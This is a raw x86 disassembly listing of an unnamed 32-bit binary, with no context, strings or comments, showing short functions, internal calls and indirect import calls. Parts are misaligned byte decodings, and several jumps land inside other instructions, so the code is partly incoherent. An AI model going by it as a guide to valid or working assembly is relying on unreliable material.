  4d10d0:	call   0x4d084c
  4d10d5:	add    esp,0x4
  4d10d8:	pop    ecx
  4d10d9:	push   ecx
  4d10da:	push   DWORD PTR [ecx+0x18]
  4d10dd:	push   DWORD PTR [ecx+0xcc]
  4d10e3:	push   ebx
  4d10e4:	push   DWORD PTR [ecx+0x94]
  4d10ea:	call   0x4d0dc8
  4d10ef:	add    esp,0x10
  4d10f2:	pop    ecx
  4d10f3:	push   ecx
  4d10f4:	mov    eax,0x0
  4d10f9:	push   eax
  4d10fa:	call   0x4d0e18
  4d10ff:	add    esp,0x4
  4d1102:	pop    ecx
  4d1103:	add    esp,0x30
  4d1106:	pop    ebp
  4d1107:	ret    
  4d1108:	mov    edi,edi
  4d110a:	push   ebp
  4d110b:	mov    ebp,esp
  4d110d:	sub    esp,0x60
  4d1110:	lea    ecx,ds:0x4d3084
  4d1116:	mov    eax,0xfffffff3
  4d111b:	push   ecx
  4d111c:	push   edx
  4d111d:	push   edx
  4d111e:	call   0x4d0d30
  4d1123:	add    esp,0x8
  4d1126:	pop    ecx
  4d1127:	push   ecx
  4d1128:	push   0x0
  4d112a:	call   0x4d0d24
  4d112f:	add    esp,0x4
  4d1132:	pop    ecx
  4d1133:	push   ecx
  4d1134:	call   0x4d084c
  4d1139:	add    esp,0x4
  4d113c:	pop    ecx
  4d113d:	add    esp,0x60
  4d1140:	pop    ebp
  4d1141:	ret    
  4d1142:	add    BYTE PTR [eax],al
  4d1144:	pop    edi
  4d1145:	call   DWORD PTR ds:0x4d2064
  4d114b:	call   edi
  4d114d:	add    BYTE PTR [eax],al
  4d114f:	add    BYTE PTR [edi-0x1],bl
  4d1152:	adc    eax,0x4d2038
  4d1157:	call   edi
  4d1159:	add    BYTE PTR [eax],al
  4d115b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1161:	sub    esp,0x34
  4d1164:	lea    ecx,[esi+0x88]
  4d116a:	mov    edi,DWORD PTR [ebp-0x14]
  4d116d:	push   ecx
  4d116e:	call   0x4d0d18
  4d1173:	add    esp,0x4
  4d1176:	pop    ecx
  4d1177:	push   ecx
  4d1178:	push   DWORD PTR [ecx+0xc0]
  4d117e:	push   DWORD PTR [ecx+0x20]
  4d1181:	push   esi
  4d1182:	push   DWORD PTR [ecx+0x4c]
  4d1185:	call   0x4d0fa0
  4d118a:	add    esp,0x10
  4d118d:	pop    ecx
  4d118e:	push   ecx
  4d118f:	push   0x0
  4d1191:	call   0x4d12ec
  4d1196:	add    esp,0x4
  4d1199:	pop    ecx
  4d119a:	add    esp,0x34
  4d119d:	pop    ebp
  4d119e:	ret    
  4d119f:	add    BYTE PTR [edi-0x1],bl
  4d11a2:	adc    eax,0x4d2074
  4d11a7:	call   edi
  4d11a9:	add    BYTE PTR [eax],al
  4d11ab:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d11b1:	sub    esp,0x60
  4d11b4:	mov    ebx,0x4d308c
  4d11b9:	sub    DWORD PTR [ebx+0x80],edi
  4d11bf:	push   ebx
  4d11c0:	push   esi
  4d11c1:	push   DWORD PTR [ebx+0xdc]
  4d11c7:	call   0x4d0bcc
  4d11cc:	add    esp,0x8
  4d11cf:	pop    ebx
  4d11d0:	lea    ecx,[ebx-0x8c]
  4d11d6:	push   ecx
  4d11d7:	call   0x4d0fe4
  4d11dc:	add    esp,0x4
  4d11df:	test   eax,eax
  4d11e1:	jne    0x4d11d1
  4d11e3:	push   0x0
  4d11e5:	call   0x4d12ec
  4d11ea:	add    esp,0x4
  4d11ed:	add    esp,0x60
  4d11f0:	pop    ebp
  4d11f1:	ret    
  4d11f2:	add    BYTE PTR [eax],al
  4d11f4:	mov    edi,edi
  4d11f6:	push   ebp
  4d11f7:	mov    ebp,esp
  4d11f9:	sub    esp,0x54
  4d11fc:	lea    eax,[esi-0x140]
  4d1202:	or     edi,DWORD PTR [ebp-0x10]
  4d1205:	push   eax
  4d1206:	push   DWORD PTR [eax+0x120]
  4d120c:	push   DWORD PTR [eax+0x5c]
  4d120f:	push   edi
  4d1210:	call   0x4d11ac
  4d1215:	add    esp,0xc
  4d1218:	pop    eax
  4d1219:	push   eax
  4d121a:	mov    eax,0x0
  4d121f:	push   eax
  4d1220:	call   0x4d12ec
  4d1225:	add    esp,0x4
  4d1228:	pop    eax
  4d1229:	push   eax
  4d122a:	push   0x0
  4d122c:	call   0x4d0f4c
  4d1231:	add    esp,0x4
  4d1234:	pop    eax
  4d1235:	add    esp,0x54
  4d1238:	pop    ebp
  4d1239:	ret    
  4d123a:	add    BYTE PTR [eax],al
  4d123c:	mov    edi,edi
  4d123e:	push   ebp
  4d123f:	mov    ebp,esp
  4d1241:	sub    esp,0x40
  4d1244:	lea    eax,[edi-0xd0]
  4d124a:	and    DWORD PTR [ebp-0x10],edi
  4d124d:	push   eax
  4d124e:	push   edx
  4d124f:	push   DWORD PTR [eax+0x60]
  4d1252:	push   ecx
  4d1253:	push   DWORD PTR [eax+0x164]
  4d1259:	call   0x4d1108
  4d125e:	add    esp,0x10
  4d1261:	pop    eax
  4d1262:	push   eax
  4d1263:	call   0x4d0d18
  4d1268:	add    esp,0x4
  4d126b:	pop    eax
  4d126c:	push   eax
  4d126d:	push   0xfffffff4
  4d126f:	call   0x4d0b2c
  4d1274:	add    esp,0x4
  4d1277:	pop    eax
  4d1278:	add    esp,0x40
  4d127b:	pop    ebp
  4d127c:	ret    
  4d127d:	add    BYTE PTR [eax],al
  4d127f:	add    BYTE PTR [edi-0x1],bl
  4d1282:	adc    eax,0x4d2080
  4d1287:	call   edi
  4d1289:	add    BYTE PTR [eax],al
  4d128b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1291:	sub    esp,0x48
  4d1294:	lea    ebx,[ecx+0x50]
  4d1297:	sub    esi,edi
  4d1299:	push   0x0
  4d129b:	call   0x4d0858
  4d12a0:	add    esp,0x4
  4d12a3:	push   ebx
  4d12a4:	push   edx
  4d12a5:	push   DWORD PTR [ebx+0x128]
  4d12ab:	push   DWORD PTR [ebx+0x1f8]
  4d12b1:	push   esi
  4d12b2:	call   0x4d1038
  4d12b7:	add    esp,0x10
  4d12ba:	pop    ebx
  4d12bb:	call   0x4d0c6c
  4d12c0:	add    esp,0x4
  4d12c3:	add    esp,0x48
  4d12c6:	pop    ebp
  4d12c7:	ret    
  4d12c8:	pop    edi
  4d12c9:	call   DWORD PTR ds:0x4d2044
  4d12cf:	call   edi
  4d12d1:	add    BYTE PTR [eax],al
  4d12d3:	add    BYTE PTR [edi-0x1],bl
  4d12d6:	adc    eax,0x4d208c
  4d12db:	call   edi
  4d12dd:	add    BYTE PTR [eax],al
  4d12df:	add    BYTE PTR [edi-0x1],bl
  4d12e2:	adc    eax,0x4d204c
  4d12e7:	call   edi
  4d12e9:	add    BYTE PTR [eax],al
  4d12eb:	add    BYTE PTR [edi-0x1],bl
  4d12ee:	adc    eax,0x4d200c
  4d12f3:	call   edi
  4d12f5:	add    BYTE PTR [eax],al
  4d12f7:	add    BYTE PTR [edi-0x1],bl
  4d12fa:	adc    eax,0x4d2014
  4d12ff:	call   edi
  4d1301:	add    BYTE PTR [eax],al
  4d1303:	add    BYTE PTR [edi-0x1],bl
  4d1306:	adc    eax,0x4d2040
  4d130b:	call   edi
  4d130d:	add    BYTE PTR [eax],al
  4d130f:	add    BYTE PTR [edi-0x1],bl
  4d1312:	adc    eax,0x4d2098
  4d1317:	call   edi
  4d1319:	add    BYTE PTR [eax],al
  4d131b:	add    BYTE PTR [edi-0x1],bl
  4d131e:	adc    eax,0x4d203c
  4d1323:	call   edi
  4d1325:	add    BYTE PTR [eax],al
  4d1327:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d132d:	sub    esp,0x34
  4d1330:	mov    ebx,0x4d3088
  4d1335:	sub    DWORD PTR [ebp-0x2c],ecx
  4d1338:	push   0x0
  4d133a:	call   0x4d08c8
  4d133f:	add    esp,0x4
  4d1342:	push   ebx
  4d1343:	push   edx
  4d1344:	push   DWORD PTR [ebx+0x2c]
  4d1347:	push   edx
  4d1348:	push   ecx
  4d1349:	call   0x4d0778
  4d134e:	add    esp,0x10
  4d1351:	pop    ebx
  4d1352:	mov    edi,0x0
  4d1357:	push   edi
  4d1358:	call   0x4d08c8
  4d135d:	add    esp,0x4
  4d1360:	add    esp,0x34
  4d1363:	pop    ebp
  4d1364:	ret    
  4d1365:	add    BYTE PTR [eax],al
  4d1367:	add    BYTE PTR [edi-0x1],bl
  4d136a:	adc    eax,0x4d2078
  4d136f:	call   edi
  4d1371:	add    BYTE PTR [eax],al
  4d1373:	add    BYTE PTR [edi-0x1],bl
  4d1376:	adc    eax,0x4d2084
  4d137b:	call   edi
  4d137d:	add    BYTE PTR [eax],al
  4d137f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1385:	sub    esp,0x44
  4d1388:	mov    edi,0x4d30dc
  4d138d:	xor    DWORD PTR [edi+0x74],0xf8b
  4d1394:	push   edi
  4d1395:	push   0x0
  4d1397:	call   0x4d0858
  4d139c:	add    esp,0x4
  4d139f:	pop    edi
  4d13a0:	push   edi
  4d13a1:	push   DWORD PTR [edi+0x1b0]
  4d13a7:	push   ebx
  4d13a8:	push   ebx
  4d13a9:	push   DWORD PTR [edi+0x94]
  4d13af:	call   0x4d096c
  4d13b4:	add    esp,0x10
  4d13b7:	pop    edi
  4d13b8:	push   edi
  4d13b9:	mov    ebx,0x0
  4d13be:	push   ebx
  4d13bf:	call   0x4d12f8
  4d13c4:	add    esp,0x4
  4d13c7:	pop    edi
  4d13c8:	add    esp,0x44
  4d13cb:	pop    ebp
  4d13cc:	ret    
  4d13cd:	add    BYTE PTR [eax],al
  4d13cf:	add    BYTE PTR [edi-0x1],bl
  4d13d2:	adc    eax,0x4d2094
  4d13d7:	call   edi
  4d13d9:	add    BYTE PTR [eax],al
  4d13db:	add    BYTE PTR [edi-0x1],bl
  4d13de:	adc    eax,0x4d2070
  4d13e3:	call   edi
  4d13e5:	add    BYTE PTR [eax],al
  4d13e7:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d13ed:	sub    esp,0x5c
  4d13f0:	mov    ebx,0x4d3164
  4d13f5:	add    DWORD PTR [ebx-0x114],esi
  4d13fb:	push   ebx
  4d13fc:	push   eax
  4d13fd:	push   ecx
  4d13fe:	call   0x4d0b44
  4d1403:	add    esp,0x8
  4d1406:	pop    ebx
  4d1407:	call   0x4d0d18
  4d140c:	add    esp,0x4
  4d140f:	call   0x4d0c6c
  4d1414:	add    esp,0x4
  4d1417:	add    esp,0x5c
  4d141a:	pop    ebp
  4d141b:	ret    
  4d141c:	mov    edi,edi
  4d141e:	push   ebp
  4d141f:	mov    ebp,esp
  4d1421:	sub    esp,0x44
  4d1424:	lea    edx,[edi+0x9c]
  4d142a:	sub    eax,0xffffffad
  4d142d:	push   edx
  4d142e:	mov    esi,0x0
  4d1433:	push   esi
  4d1434:	call   0x4d08c8
  4d1439:	add    esp,0x4
  4d143c:	pop    edx
  4d143d:	push   edx
  4d143e:	push   DWORD PTR [edx+0x10c]
  4d1444:	push   DWORD PTR [edx+0xc4]
  4d144a:	push   DWORD PTR [edx+0x160]
  4d1450:	push   DWORD PTR [edx+0x128]
  4d1456:	call   0x4d0c78
  4d145b:	add    esp,0x10
  4d145e:	pop    edx
  4d145f:	push   edx
  4d1460:	mov    esi,0x0
  4d1465:	push   esi
  4d1466:	call   0x4d0f4c
  4d146b:	add    esp,0x4
  4d146e:	pop    edx
  4d146f:	add    esp,0x44
  4d1472:	pop    ebp
  4d1473:	ret    
  4d1474:	mov    edi,edi
  4d1476:	push   ebp
  4d1477:	mov    ebp,esp
  4d1479:	sub    esp,0x5c
  4d147c:	lea    esi,[edi+0x180]
  4d1482:	add    DWORD PTR [esi+0x20],0x65d0
  4d1489:	mov    edx,0x0
  4d148e:	push   edx
  4d148f:	call   0x4d0858
  4d1494:	add    esp,0x4
  4d1497:	push   esi
  4d1498:	push   DWORD PTR [esi+0x20]
  4d149b:	push   edi
  4d149c:	push   ebx
  4d149d:	call   0x4d10b8
  4d14a2:	add    esp,0xc
  4d14a5:	pop    esi
  4d14a6:	mov    edx,0x0
  4d14ab:	push   edx
  4d14ac:	call   0x4d12ec
  4d14b1:	add    esp,0x4
  4d14b4:	add    esp,0x5c
  4d14b7:	pop    ebp
  4d14b8:	ret    
  4d14b9:	add    BYTE PTR [eax],al
  4d14bb:	add    BYTE PTR [edi-0x1],bl
  4d14be:	adc    eax,0x4d2054
  4d14c3:	call   edi
  4d14c5:	add    BYTE PTR [eax],al
  4d14c7:	add    BYTE PTR [edi-0x1],bl
  4d14ca:	adc    eax,0x4d2048
  4d14cf:	call   edi
  4d14d1:	add    BYTE PTR [eax],al
  4d14d3:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d14d9:	sub    esp,0x20
  4d14dc:	mov    ebx,0x4d31b4
  4d14e1:	adc    eax,DWORD PTR [ebx+0xc]
  4d14e4:	lea    edx,[ebx-0x1b4]
  4d14ea:	push   edx
  4d14eb:	call   0x4d0fe4
  4d14f0:	add    esp,0x4
  4d14f3:	test   eax,eax
  4d14f5:	jne    0x4d14e5
  4d14f7:	push   ebx
  4d14f8:	push   DWORD PTR [ebx+0xb4]
  4d14fe:	push   DWORD PTR [ebx+0x11c]
  4d1504:	call   0x4d0b88
  4d1509:	add    esp,0x8
  4d150c:	pop    ebx
  4d150d:	push   0x0
  4d150f:	call   0x4d0e18
  4d1514:	add    esp,0x4
  4d1517:	add    esp,0x20
  4d151a:	pop    ebp
  4d151b:	ret    
  4d151c:	pop    edi
  4d151d:	call   DWORD PTR ds:0x4d20a0
  4d1523:	call   edi
  4d1525:	add    BYTE PTR [eax],al
  4d1527:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d152d:	sub    esp,0x30
  4d1530:	lea    esi,ds:0x4d31e4
  4d1536:	cmp    esi,0x6deb
  4d153c:	jbe    0x4d152b
  4d153e:	call   0x4d0c6c
  4d1543:	add    esp,0x4
  4d1546:	push   esi
  4d1547:	push   edx
  4d1548:	push   ecx
  4d1549:	call   0x4d08e0
  4d154e:	add    esp,0x8
  4d1551:	pop    esi
  4d1552:	mov    edi,0x0
  4d1557:	push   edi
  4d1558:	call   0x4d0a90
  4d155d:	add    esp,0x4
  4d1560:	add    esp,0x30
  4d1563:	pop    ebp
  4d1564:	ret    
  4d1565:	add    BYTE PTR [eax],al
  4d1567:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d156d:	sub    esp,0x30
  4d1570:	lea    ebx,ds:0x4d3034
  4d1576:	mov    edx,DWORD PTR [ebp-0x18]
  4d1579:	lea    esi,[ebx-0x34]
  4d157c:	push   esi
  4d157d:	call   0x4d0fe4
  4d1582:	add    esp,0x4
  4d1585:	test   eax,eax
  4d1587:	jne    0x4d157a
  4d1589:	push   ebx
  4d158a:	push   esi
  4d158b:	push   DWORD PTR [ebx+0x180]
  4d1591:	push   ecx
  4d1592:	push   edi
  4d1593:	call   0x4d1528
  4d1598:	add    esp,0x10
  4d159b:	pop    ebx
  4d159c:	mov    edi,0x0
  4d15a1:	push   edi
  4d15a2:	call   0x4d0e18
  4d15a7:	add    esp,0x4
  4d15aa:	add    esp,0x30
  4d15ad:	pop    ebp
  4d15ae:	ret    
	...
